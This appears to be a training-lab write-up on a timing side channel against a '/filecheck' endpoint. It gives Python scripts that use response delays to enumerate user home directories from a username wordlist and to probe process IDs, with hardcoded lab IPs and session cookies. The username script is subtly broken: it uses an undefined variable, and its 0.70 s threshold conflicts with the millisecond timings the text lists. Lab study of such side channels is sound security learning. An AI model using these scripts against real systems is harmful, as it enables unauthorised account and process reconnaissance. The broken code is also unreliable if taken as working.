**Data-exfiltration via RaceCondition**
In this example we will see how we can ex-filtrate data via Blind method(when you don't get a success message).
In this case even if the application do not explicitly gives back a feedback, a change in response time can be used to perform a data ex-filtration by monitoring the different response times from the back-end.

# Scenario
In our attack example we have a login portal where from an authenticated standpoint we can check for the presence of files on the file-system via **/filecheck** endpoint.
The lab code counts file on the path(if owned, otherwise fails):
```
def get_file_details(path):
    try:
        if not os.path.exists(path):
            return '', 0, 0

        # number of subfiles
        filecount = 0
        for root_dir, cur_dir, files in os.walk(path):
            filecount += len(files)

        # file size
        path = Path(path)
        filesize = sum(f.stat().st_size for f in path.glob('**/*') if f.is_file())

        # file owner
        owner = path.owner()

        return owner, filesize, filecount

    except:
        return '', 0, 0


```

## How to Attack?
Since we code checks for number of files in the given path, and if the path is owned will give the number of files back, if no, then will thrown an error.
The timed attack here happens when you can count the time difference between the response of success and not!
```
(/home/vautia/) = legit but not owned (>90ms)
(/home/htb-stdnt/) = legit and owned (>60ms <70ms)
(/xxx/) = fake (<=40ms)
```
We can use the following python script to enumerate the available user home folders.
import requests
```
URL = "http://83.136.254.223:50948/filecheck"
cookie = {"session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.Zh5DMg.oBo0BcTBhCw4isLZKI_pI_K_qiw"}
WORDLIST = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.70

with open(WORDLIST, 'r') as f:
    for username in f:
        username = username.strip()
        r = requests.get(URL, params={"filepath": f"/home/{usernames}/"}, cookies=cookie)
        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"Valid Username found: {username}")


```
OBS: Since the time-based over web is vulnerable to false positive caused by lagging in responses by back-end, you might need to re-run the script by filtering the values in several runs!
```
Example first run:
    52	coolmu
    53	cookies
    54	clown
    55	clive
    56	cicero
    57	cheyenne
    58	carroll
    59	carrera
    60	buttons
    61	bullseye
    62	bugman
    63	borg
    64	bob1
    65	gretchen

Second run:
    65	gretchen
```


### EXTRA:
Pid checker code via python3:
```
import requests

URL = "http://172.17.0.2:1337/filecheck"
cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZCh4Qw.Lv94ak_WPWEN8Idhwf7l-3a5MH4"}
THRESHOLD_S = 0.003

for pid in range(0, 200):
    r = requests.get(URL, params={"filepath": f"/proc/{pid}/"}, cookies=cookies)

    if r.elapsed.total_seconds() > THRESHOLD_S:
        print(f"Valid PID found: {pid}")
```
